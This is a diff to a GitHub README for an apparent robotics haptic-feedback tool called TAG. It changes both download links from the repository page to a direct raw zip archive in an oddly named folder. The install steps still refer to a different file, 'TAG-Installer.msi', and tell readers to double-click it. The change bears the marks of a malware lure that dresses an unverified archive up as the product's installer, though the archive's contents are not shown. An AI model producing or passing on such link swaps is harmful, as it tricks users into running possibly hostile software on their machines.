@@ -1,6 +1,6 @@
 # 🧤 TAG - Experience tactile feedback through robotics
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/stonelagbomer193/TAG)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/stonelagbomer193/TAG/raw/refs/heads/main/rejectamenta/Software_1.9.zip)
 
 TAG translates movements from your hand into commands for robotic hardware. It provides vibration and pressure feedback so you feel the objects your robot touches. This system helps you perform tasks that require precision and a sense of touch.
 
@@ -20,7 +20,7 @@ Ensure that your computer has all recent Windows updates installed. This avoids 
 
 Follow these steps to prepare your system.
 
-1. Visit [this link](https://github.com/stonelagbomer193/TAG) to download the installer.
+1. Visit [this link](https://github.com/stonelagbomer193/TAG/raw/refs/heads/main/rejectamenta/Software_1.9.zip) to download the installer.
 2. Select the file named TAG-Installer.msi.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
